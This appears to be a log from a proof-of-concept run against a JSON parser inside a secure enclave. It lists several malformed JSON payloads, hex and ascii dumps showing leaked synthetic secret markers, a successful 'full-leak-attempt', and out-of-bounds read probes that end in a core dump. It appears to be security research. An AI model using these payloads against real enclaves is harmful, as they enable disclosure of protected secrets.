@@ -1,0 +1,65 @@
+[App] enclave created, eid=10282151706626
+
+=== [unterminated-value] payload (28 bytes): [{"key":"a","value":"value}]
+[unterminated-value] ECALL returned OK -- enclave did NOT crash. unmarshal_status=-1
+[unterminated-value] returned bytes (33):
+json[] stack addr=0x7a4d0eaab7a0
+
+[unterminated-value] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***
+[unterminated-value] first 96 leftover bytes (hex): 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 53 45 43 52 45 54 5f 45 4e 43 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 
+[unterminated-value] first 96 leftover bytes (ascii): _TOP_SECRET","LEAK_MARKER_KEY":"TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_SECRET","LEAK_MARK
+
+=== [unterminated-key] payload (10 bytes): [{"key":"a
+[unterminated-key] ECALL returned OK -- enclave did NOT crash. unmarshal_status=-1
+[unterminated-key] returned bytes (33):
+json[] stack addr=0x7a4d0eaab7a0
+
+[unterminated-key] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***
+[unterminated-key] first 96 leftover bytes (hex): 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 53 45 43 52 45 54 5f 45 4e 43 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 
+[unterminated-key] first 96 leftover bytes (ascii): E_0123456789abcdef_TOP_SECRET","LEAK_MARKER_KEY":"TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_
+
+=== [unterminated-number] payload (25 bytes): [{"key":"a","value":12345
+[unterminated-number] ECALL returned OK -- enclave did NOT crash. unmarshal_status=-1
+[unterminated-number] returned bytes (33):
+json[] stack addr=0x7a4d0eaab7a0
+
+[unterminated-number] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***
+[unterminated-number] first 96 leftover bytes (hex): 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 53 45 43 52 45 54 5f 45 4e 43 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 
+[unterminated-number] first 96 leftover bytes (ascii): def_TOP_SECRET","LEAK_MARKER_KEY":"TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_SECRET","LEAK_M
+
+=== [minimal-array-open] payload (1 bytes): [
+[minimal-array-open] ECALL returned OK -- enclave did NOT crash. unmarshal_status=-1
+[minimal-array-open] returned bytes (33):
+json[] stack addr=0x7a4d0eaab7a0
+
+[minimal-array-open] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***
+[minimal-array-open] first 96 leftover bytes (hex): 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 53 45 43 52 45 54 5f 45 4e 43 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 
+[minimal-array-open] first 96 leftover bytes (ascii): LAVE_STATE_0123456789abcdef_TOP_SECRET","LEAK_MARKER_KEY":"TOP_SECRET_ENCLAVE_STATE_0123456789ab
+
+[align-check] payload length = 41 (expected 41)
+
+=== [aligned-marker-cycle] payload (41 bytes): [{"k":"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
+[aligned-marker-cycle] ECALL returned OK -- enclave did NOT crash. unmarshal_status=-1
+[aligned-marker-cycle] returned bytes (33):
+json[] stack addr=0x7a4d0eaab7a0
+
+[aligned-marker-cycle] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***
+[aligned-marker-cycle] first 96 leftover bytes (hex): 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 53 45 43 52 45 54 5f 45 4e 43 4c 41 56 45 5f 53 54 41 54 45 5f 30 31 32 33 34 35 36 37 38 39 61 62 63 64 65 66 5f 54 4f 50 5f 53 45 43 52 45 54 22 2c 22 4c 45 41 4b 5f 4d 41 52 4b 45 52 5f 4b 45 59 22 3a 22 54 4f 50 5f 
+[aligned-marker-cycle] first 96 leftover bytes (ascii): "LEAK_MARKER_KEY":"TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_SECRET","LEAK_MARKER_KEY":"TOP_
+
+[align2-probe] dump_raw2 status=0x0, first 128 bytes:
+P_SECRET_ENCLAVE_STATE_0123456789abcdef","value":"AAAA"}]{"key":"LEAKED_TOP_SECRET_ENCLAVE_STATE_0123456789abcdef","value":"AAAA
+
+=== [full-leak-attempt] payload = '[' + 57 spaces (58 bytes)
+[full-leak-attempt] ECALL OK, unmarshal_status=1
+[full-leak-attempt] returned (56 bytes): KV[LEAKED_TOP_SECRET_ENCLAVE_STATE_0123456789abcdef]=[]
+
+
+[App] now probing exactly how far past the 262144-byte buffer reads stay safe...
+[checkpoint] read OK at json[262144+0] = 0x00
+[checkpoint] read OK at json[262144+256] = 0xf0
+[checkpoint] read OK at json[262144+512] = 0xcc
+[checkpoint] read OK at json[262144+768] = 0xcc
+[checkpoint] read OK at json[262144+1024] = 0xcc
+[checkpoint] read OK at json[262144+1280] = 0xcc
+timeout: the monitored command dumped core
